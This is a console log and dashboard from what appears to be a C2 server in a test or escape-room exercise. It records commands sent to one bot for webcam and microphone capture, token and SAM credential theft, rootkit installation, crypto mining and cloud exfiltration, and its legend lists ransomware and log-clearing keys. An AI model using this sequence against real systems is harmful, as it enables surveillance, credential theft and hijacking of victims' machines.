+[2025-08-24 19:05:11] [CMD_RESPONSE   ] [RESPONSE_RECEIVED   ] [RESP_8865171_3.81.15.120:51261] From 3.81.15.120:51261: HEARTBEAT:35.175.236.219:443_8842796:8857843HEARTBEAT:35.175.236.219:443_8842796:8862859 (88 bytes)
+[2025-08-24 19:05:11] [DEBUG          ] [UNRECOGNIZED_DATA   ] Saving unrecognized data from 3.81.15.120:51261 - Length: 88
+[2025-08-24 19:05:11] [ERROR          ] [EVIDENCE_SAVE_FAILED] Failed to save unknown to C:\evidence\-%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d\unknown\20250824_190511_139.txt
+[2025-08-24 19:05:12] [C2             ] [COMMAND             ] Capturing webcam on all bots
+[2025-08-24 19:05:12] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:12] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_19895_8866500] Command WEBCAM_SURVEILLANCE sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: WEBCAM_SURVEILLANCE (ID: 38) to 3.81.15.120:51261
+[2025-08-24 19:05:12] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent WEBCAM_SURVEILLANCE packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 38
+[2025-08-24 19:05:12] [C2             ] [COMMAND_SENT        ] Sent WEBCAM_SURVEILLANCE to 3.81.15.120:51261
+[2025-08-24 19:05:12] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:WEBCAM_SURVEILLANCE:REQUEST_DATA
+ - Bytes: 37
+[2025-08-24 19:05:12] [C2             ] [COMMAND_SENT        ] Sent WEBCAM_SURVEILLANCE to 3.81.15.120:51261
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 3        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 34      |  Server Uptime: 0          min |
+| [19:05:15] SERVER STATUS: ONLINE | Recent Activity: 100 entries |
+[2025-08-24 19:05:15] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 34
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 4  s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 16 commands sent recently | Total Session: 34 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND_SENT: Sent WEBCAM_SURVEILLANCE to 3.81.15.12... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+| [C2] COMMAND_SENT: Sent WEBCAM_SURVEILLANCE to 3.81.15.12... |
+| [DEBUG] COMMAND_PACKET_SENT: Sent WEBCAM_SURVEILLANCE pac... |
+| [CMD_SENT] COMMAND_DISPATCH: [SRV_CMD_19895_8866500] Comm... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:05:15] Server running. Total commands sent: 34
+[2025-08-24 19:05:15] [C2             ] [COMMAND             ] Full system info collection on all bots
+[2025-08-24 19:05:16] [C2             ] [PROCESSING_QUEUE    ] Processing 6 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_5447_8870140] Command SYSTEM_INFO_COLLECTION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SYSTEM_INFO_COLLECTION (ID: 16) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SYSTEM_INFO_COLLECTION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 16
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent SYSTEM_INFO_COLLECTION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SYSTEM_INFO_COLLECTION:REQUEST_DATA
+ - Bytes: 40
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent SYSTEM_INFO_COLLECTION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_21726_8870156] Command PROCESS_ENUMERATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: PROCESS_ENUMERATION (ID: 17) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent PROCESS_ENUMERATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 17
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent PROCESS_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:PROCESS_ENUMERATION:REQUEST_DATA
+ - Bytes: 37
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent PROCESS_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_14771_8870156] Command NETWORK_CONFIGURATION_DISCOVERY sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: NETWORK_CONFIGURATION_DISCOVERY (ID: 18) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent NETWORK_CONFIGURATION_DISCOVERY packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 18
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent NETWORK_CONFIGURATION_DISCOVERY to 3.81.15.120:51261[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:NETWORK_CONFIGURATION_DISCOVERY:REQUEST_DATA
+ - Bytes: 49
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent NETWORK_CONFIGURATION_DISCOVERY to 3.81.15.120:51261[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_11538_8870171] Command USER_ACCOUNT_ENUMERATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: USER_ACCOUNT_ENUMERATION (ID: 19) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent USER_ACCOUNT_ENUMERATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 19
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent USER_ACCOUNT_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:USER_ACCOUNT_ENUMERATION:REQUEST_DATA
+ - Bytes: 42
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent USER_ACCOUNT_ENUMERATION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_1869_8870171] Command DOMAIN_INFORMATION_GATHERING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: DOMAIN_INFORMATION_GATHERING (ID: 20) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent DOMAIN_INFORMATION_GATHERING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 20
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent DOMAIN_INFORMATION_GATHERING to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:DOMAIN_INFORMATION_GATHERING:REQUEST_DATA
+ - Bytes: 46
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent DOMAIN_INFORMATION_GATHERING to 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_19912_8870187] Command SOFTWARE_DISCOVERY sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SOFTWARE_DISCOVERY (ID: 21) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SOFTWARE_DISCOVERY packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 21
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent SOFTWARE_DISCOVERY to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SOFTWARE_DISCOVERY:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent SOFTWARE_DISCOVERY to 3.81.15.120:51261
+[2025-08-24 19:05:16] [C2             ] [COMMAND             ] Process hollowing demo on all bots
+[2025-08-24 19:05:16] [C2             ] [COMMAND             ] Microphone recording on all bots
+[2025-08-24 19:05:16] [C2             ] [PROCESSING_QUEUE    ] Processing 2 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_25667_8870812] Command PROCESS_HOLLOWING_INJECTION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: PROCESS_HOLLOWING_INJECTION (ID: 115) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent PROCESS_HOLLOWING_INJECTION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 115
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent PROCESS_HOLLOWING_INJECTION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:PROCESS_HOLLOWING_INJECTION:REQUEST_DATA
+ - Bytes: 45
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent PROCESS_HOLLOWING_INJECTION to 3.81.15.120:51261
+[2025-08-24 19:05:16] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_26299_8870828] Command AUDIO_RECORDING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: AUDIO_RECORDING (ID: 39) to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent AUDIO_RECORDING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 39
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent AUDIO_RECORDING to 3.81.15.120:51261
+[2025-08-24 19:05:16] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:AUDIO_RECORDING:REQUEST_DATA
+ - Bytes: 33
+[2025-08-24 19:05:16] [C2             ] [COMMAND_SENT        ] Sent AUDIO_RECORDING to 3.81.15.120:51261
+[2025-08-24 19:05:16] [C2             ] [COMMAND             ] Clipboard capture on all bots
+[2025-08-24 19:05:17] [C2             ] [COMMAND             ] File search on all bots
+[2025-08-24 19:05:17] [C2             ] [PROCESSING_QUEUE    ] Processing 2 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:17] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_17035_8871453] Command CLIPBOARD_DATA_COLLECTION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CLIPBOARD_DATA_COLLECTION (ID: 35) to 3.81.15.120:51261
+[2025-08-24 19:05:17] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CLIPBOARD_DATA_COLLECTION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 35
+[2025-08-24 19:05:17] [C2             ] [COMMAND_SENT        ] Sent CLIPBOARD_DATA_COLLECTION to 3.81.15.120:51261
+[2025-08-24 19:05:17] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CLIPBOARD_DATA_COLLECTION:REQUEST_DATA
+ - Bytes: 43
+[2025-08-24 19:05:17] [C2             ] [COMMAND_SENT        ] Sent CLIPBOARD_DATA_COLLECTION to 3.81.15.120:51261
+[2025-08-24 19:05:17] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_9894_8871468] Command FILE_SYSTEM_SEARCH sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: FILE_SYSTEM_SEARCH (ID: 37) to 3.81.15.120:51261
+[2025-08-24 19:05:17] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent FILE_SYSTEM_SEARCH packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 37
+[2025-08-24 19:05:17] [C2             ] [COMMAND_SENT        ] Sent FILE_SYSTEM_SEARCH to 3.81.15.120:51261
+[2025-08-24 19:05:17] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:FILE_SYSTEM_SEARCH:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:05:17] [C2             ] [COMMAND_SENT        ] Sent FILE_SYSTEM_SEARCH to 3.81.15.120:51261
+[2025-08-24 19:05:17] [C2             ] [COMMAND             ] Screen recording on all bots
+[2025-08-24 19:05:17] [C2             ] [COMMAND             ] Token stealing on all bots
+[2025-08-24 19:05:18] [C2             ] [PROCESSING_QUEUE    ] Processing 2 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:18] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_28703_8872078] Command SCREEN_RECORDING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SCREEN_RECORDING (ID: 40) to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SCREEN_RECORDING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 40
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent SCREEN_RECORDING to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SCREEN_RECORDING:REQUEST_DATA
+ - Bytes: 34
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent SCREEN_RECORDING to 3.81.15.120:51261
+[2025-08-24 19:05:18] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_23811_8872093] Command ACCESS_TOKEN_THEFT sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: ACCESS_TOKEN_THEFT (ID: 97) to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent ACCESS_TOKEN_THEFT packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 97
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent ACCESS_TOKEN_THEFT to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:ACCESS_TOKEN_THEFT:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent ACCESS_TOKEN_THEFT to 3.81.15.120:51261
+[2025-08-24 19:05:18] [C2             ] [COMMAND             ] SAM dump on all bots
+[2025-08-24 19:05:18] [C2             ] [COMMAND             ] Installing rootkit on all bots
+[2025-08-24 19:05:18] [C2             ] [PROCESSING_QUEUE    ] Processing 2 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:18] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_31322_8872718] Command SAM_DATABASE_EXTRACTION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SAM_DATABASE_EXTRACTION (ID: 100) to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SAM_DATABASE_EXTRACTION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 100
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent SAM_DATABASE_EXTRACTION to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SAM_DATABASE_EXTRACTION:REQUEST_DATA
+ - Bytes: 41
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent SAM_DATABASE_EXTRACTION to 3.81.15.120:51261
+[2025-08-24 19:05:18] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_30333_8872718] Command ROOTKIT_INSTALLATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: ROOTKIT_INSTALLATION (ID: 116) to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent ROOTKIT_INSTALLATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 116
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent ROOTKIT_INSTALLATION to 3.81.15.120:51261
+[2025-08-24 19:05:18] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:ROOTKIT_INSTALLATION:REQUEST_DATA
+ - Bytes: 38
+[2025-08-24 19:05:18] [C2             ] [COMMAND_SENT        ] Sent ROOTKIT_INSTALLATION to 3.81.15.120:51261
+[2025-08-24 19:05:18] [C2             ] [COMMAND             ] Deploying crypto miner on all bots
+[2025-08-24 19:05:19] [C2             ] [COMMAND             ] Cloud upload on all bots
+[2025-08-24 19:05:19] [C2             ] [PROCESSING_QUEUE    ] Processing 2 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:19] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_17673_8873343] Command CRYPTOCURRENCY_MINING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CRYPTOCURRENCY_MINING (ID: 147) to 3.81.15.120:51261
+[2025-08-24 19:05:19] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CRYPTOCURRENCY_MINING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 147
+[2025-08-24 19:05:19] [C2             ] [COMMAND_SENT        ] Sent CRYPTOCURRENCY_MINING to 3.81.15.120:51261
+[2025-08-24 19:05:19] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CRYPTOCURRENCY_MINING:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:05:19] [C2             ] [COMMAND_SENT        ] Sent CRYPTOCURRENCY_MINING to 3.81.15.120:51261
+[2025-08-24 19:05:19] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_4664_8873359] Command CLOUD_SERVICE_UPLOAD sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CLOUD_SERVICE_UPLOAD (ID: 134) to 3.81.15.120:51261
+[2025-08-24 19:05:19] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CLOUD_SERVICE_UPLOAD packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 134
+[2025-08-24 19:05:19] [C2             ] [COMMAND_SENT        ] Sent CLOUD_SERVICE_UPLOAD to 3.81.15.120:51261
+[2025-08-24 19:05:19] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CLOUD_SERVICE_UPLOAD:REQUEST_DATA
+ - Bytes: 38
+[2025-08-24 19:05:19] [C2             ] [COMMAND_SENT        ] Sent CLOUD_SERVICE_UPLOAD to 3.81.15.120:51261
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 3        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 50      |  Server Uptime: 0          min |
+| [19:05:20] SERVER STATUS: ONLINE | Recent Activity: 100 entries |
+[2025-08-24 19:05:20] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 50
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 9  s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 16 commands sent recently | Total Session: 50 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND_SENT: Sent CLOUD_SERVICE_UPLOAD to 3.81.15.1... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+| [C2] COMMAND_SENT: Sent CLOUD_SERVICE_UPLOAD to 3.81.15.1... |
+| [DEBUG] COMMAND_PACKET_SENT: Sent CLOUD_SERVICE_UPLOAD pa... |
+| [CMD_SENT] COMMAND_DISPATCH: [SRV_CMD_4664_8873359] Comma... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:05:20] Server running. Total commands sent: 50
+[2025-08-24 19:05:20] [C2             ] [COMMAND             ] Cloud upload on all bots
+[2025-08-24 19:05:21] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:21] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_15141_8875437] Command CLOUD_SERVICE_UPLOAD sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: CLOUD_SERVICE_UPLOAD (ID: 134) to 3.81.15.120:51261
+[2025-08-24 19:05:21] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent CLOUD_SERVICE_UPLOAD packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 134
+[2025-08-24 19:05:21] [C2             ] [COMMAND_SENT        ] Sent CLOUD_SERVICE_UPLOAD to 3.81.15.120:51261
+[2025-08-24 19:05:21] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:CLOUD_SERVICE_UPLOAD:REQUEST_DATA
+ - Bytes: 38
+[2025-08-24 19:05:21] [C2             ] [COMMAND_SENT        ] Sent CLOUD_SERVICE_UPLOAD to 3.81.15.120:51261
+[2025-08-24 19:05:22] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_31673_8876187] Command HEARTBEAT_BEACON sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: HEARTBEAT_BEACON (ID: 1) to 3.81.15.120:51261
+[2025-08-24 19:05:22] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent HEARTBEAT_BEACON packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 1
+[2025-08-24 19:05:22] [C2             ] [COMMAND_SENT        ] Sent HEARTBEAT_BEACON to 3.81.15.120:51261
+[2025-08-24 19:05:22] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:HEARTBEAT_BEACON:REQUEST_DATA
+ - Bytes: 34
+[2025-08-24 19:05:22] [DEBUG          ] [DATA_CHUNK_RECEIVED ] From 3.81.15.120:51261 - Chunk size: 88 - Total so far: 88
+[2025-08-24 19:05:22] [DEBUG          ] [RAW_DATA_RECEIVED   ] From 3.81.15.120:51261 - Total bytes: 88 - First 50 chars: HEARTBEAT:35.175.236.219:443_8842796:8867859HEARTB
+[2025-08-24 19:05:22] [DEBUG          ] [DECRYPTED_DATA      ] From 3.81.15.120:51261 - Length: 88 - Preview: HEARTBEAT:35.175.236.219:443_8842796:8867859HEARTBEAT:35.175.236.219:443_8842796:8872859
+[2025-08-24 19:05:22] [CMD_RESPONSE   ] [RESPONSE_RECEIVED   ] [RESP_8876218_3.81.15.120:51261] From 3.81.15.120:51261: HEARTBEAT:35.175.236.219:443_8842796:8867859HEARTBEAT:35.175.236.219:443_8842796:8872859 (88 bytes)
+[2025-08-24 19:05:22] [DEBUG          ] [UNRECOGNIZED_DATA   ] Saving unrecognized data from 3.81.15.120:51261 - Length: 88
+[2025-08-24 19:05:22] [ERROR          ] [EVIDENCE_SAVE_FAILED] Failed to save unknown to C:\evidence\-%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d\unknown\20250824_190522_183.txt
+PS C:\Users\Administrator\Desktop>
